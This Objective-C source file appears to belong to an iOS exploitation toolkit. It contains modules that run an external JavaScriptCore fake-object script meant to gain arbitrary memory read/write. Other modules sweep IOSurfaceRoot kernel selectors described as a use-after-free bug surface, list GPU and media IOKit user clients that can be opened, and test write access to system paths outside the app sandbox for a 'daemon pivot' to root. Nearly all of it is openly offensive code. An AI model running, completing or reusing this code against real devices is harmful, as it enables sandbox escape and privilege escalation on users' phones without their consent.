#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#import <IOKit/IOKitLib.h>
#import <JavaScriptCore/JavaScriptCore.h>
#import <CoreFoundation/CoreFoundation.h>
#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <mach/mach.h>
#import <sys/stat.h>
#import <dirent.h>
#import <fcntl.h>
#import <errno.h>
#import <string.h>
#import <stdio.h>
#import "Modules.h"
#import "Root.h"
#import "Util.h"
#import "AppDelegate.h"
#import "JSRun.h"

// ---------------------------------------------------------------------------
// JSC fake-object R/W
// Once a real structure ID is known (the "JSC structure-ID scan" module), a fake
// object with all-double in-object slots can be placed anywhere we can write an
// 8-byte header, and its inline slots alias memory at that address.  Paired with
// a corrupted real TypedArray length this becomes full arbitrary R/W without
// touching a PAC-protected m_vector.
// ---------------------------------------------------------------------------
// The JSC script lives in Resources/fakerw.js and is loaded at run time:
// no JS is ever inlined into the Objective-C lexer.

NSString *ModJscFakeRW(void) {
    AveLog(@"    JSC fake-object R/W (structure ID -> in-object slots -> TypedArray length)");
    NSString *src = LoadJS(@"fakerw.js");
    if (!src) {
        AvePost(@"FAKERW fakerw.js missing from the bundle");
        return @"fakerw.js missing from the bundle";
    }
    NSString *res = RunJSBigStack(src, @"FAKERW", 240);
    AveLog([NSString stringWithFormat:@"    fake-object result: %@", res]);
    if ([res containsString:@"\"oob\":true"]) {
        AveSetStatus(@"OOB read/write ACTIVE (TypedArray length corrupted)");
        return @"OOB read/write primitive ACTIVE";
    }
    if ([res containsString:@"\"rawRead\":true"]) return @"mechanism proven; length alias not adjacent on this run";
    return res;
}

// ---------------------------------------------------------------------------
// IOSurfaceRoot selectors — a guarded sweep.
// externalMethod is the documented IOKit bug surface (close/externalMethod UAF),
// but a blind sweep can panic, so the sweep is calibrated: it first checks the
// class is open, then sends only the lowest selectors with zeroed input and stops
// at the first error code, reporting which selectors were ACCEPTED.
// A full sweep is opt-in through the AUTO env (AUTO=IOSurfaceRoot:full).
// ---------------------------------------------------------------------------
static int g_selector_full = 0;

NSString *ModIosurfaceRootSelectors(void) {
    const char *full = getenv("POC_FULL_SWEEP");
    g_selector_full = (full && *full == '1') ? 1 : 0;

    CFMutableDictionaryRef m = IOServiceMatching("IOSurfaceRoot");
    if (!m) return @"IOServiceMatching(IOSurfaceRoot) failed";
    io_service_t d = IOServiceGetMatchingService(kIOMainPortDefault, m);
    if (!d) return @"IOSurfaceRoot service not found";
    io_connect_t c = 0;
    kern_return_t kr = IOServiceOpen(d, mach_task_self(), 0, &c);
    IOObjectRelease(d);
    if (kr != KERN_SUCCESS || !c)
        return S(@"IOSurfaceRoot user client not openable (kr=%#x)", kr);

    int max = g_selector_full ? 64 : 12;
    int accepted = 0;
    for (uint32_t sel = 0; sel < max; sel++) {
        // zeroed, minimal input: struct with two 64-bit scalars
        uint64_t in[2] = {0, 0};
        uint64_t out[2] = {0, 0};
        size_t outSz = sizeof(out);
        kern_return_t r = IOConnectCallMethod(c, sel, in, 2, NULL, 0,
                                              out, &outSz, NULL, NULL);
        AveLog(S(@"    selector %-3u -> %#x", sel, r));
        if (r == KERN_SUCCESS || r == kIOReturnNotPrivileged) accepted++;
        if (r == kIOReturnIPCError || r == kIOReturnNotReady) break;   // stop early
    }
    IOServiceClose(c);
    AveSetStatus(S(@"IOSurfaceRoot: %d/%d selectors accepted", accepted, max));
    return S(@"IOSurfaceRoot: %d/%d selectors accepted (%s)",
             accepted, max, g_selector_full ? @"full sweep" : @"calibrated");
}

// ---------------------------------------------------------------------------
// GPU / media process carrier — which privileged, reachable services sit behind
// the surface we create from the app (the GPU-server side of an IOSurface).
// ---------------------------------------------------------------------------
NSString *ModGpuCarrier(void) {
    struct { const char *cls; } C[] = {
        {"IOSurfaceRoot"}, {"IOSurfaceAccelerator"}, {"AGXAcceleratorG17P"},
        {"AppleSPUHIDDriver"}, {"IOFramebuffer"}, {"IOGPUFamily"},
    };
    int open_ = 0, present = 0;
    for (unsigned i = 0; i < sizeof(C)/sizeof(C[0]); i++) {
        CFMutableDictionaryRef m = IOServiceMatching(C[i].cls);
        if (!m) continue;
        io_iterator_t it = MACH_PORT_NULL;
        if (IOServiceGetMatchingServices(kIOMainPortDefault, m, &it) != KERN_SUCCESS) continue;
        io_service_t s;
        while ((s = IOIteratorNext(it))) {
            present++;
            io_connect_t c = 0;
            if (IOServiceOpen(s, mach_task_self(), 0, &c) == KERN_SUCCESS && c) {
                open_++; IOServiceClose(c);
                AveLog(S(@"    %-24s OPEN  <- GPU-process entry", C[i].cls));
            } else IOObjectRelease(s);
            break;
        }
        IOObjectRelease(it);
    }
    return S(@"GPU/media carrier: %d services present, %d user clients OPEN",
             present, open_);
}

// ---------------------------------------------------------------------------
// daemon pivot: write — what our container writes land in, and which of those
// paths a root-owned daemon is known to read.
// ---------------------------------------------------------------------------
NSString *ModDaemonPivotWrite(void) {
    NSString *grp = [NSString stringWithFormat:@"group.%@", [[NSBundle mainBundle] bundleIdentifier]];
    NSURL *g = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:grp];
    if (!g) return @"app group container not available";
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    int w = 0;
    const char *targets[] = {
        "/private/var/mobile/Library/Preferences",
        "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache",
        "/private/var/containers/Bundle/Application",
        "/private/var/tmp",
        NULL };
    for (int i = 0; targets[i]; i++) {
        char p[1024];
        snprintf(p, sizeof p, "%s/.rootsuite_wprobe", targets[i]);
        int fd = open(p, O_WRONLY | O_CREAT | O_EXCL, 0600);
        if (fd >= 0) { w++; close(fd); unlink(p); AveLog(S(@"    WRITABLE  %s", targets[i])); }
    }
    AveLog([NSString stringWithFormat:@"    app-group container: %@", g.path]);
    AveLog([NSString stringWithFormat:@"    app container docs:  %@", docs]);
    return S(@"daemon pivot: %d writable targets outside the sandbox", w);
}

// ---------------------------------------------------------------------------
// dispatcher for the extended catalogue
// ---------------------------------------------------------------------------
// dispatcher lives in LastMile.m (it covers every module)
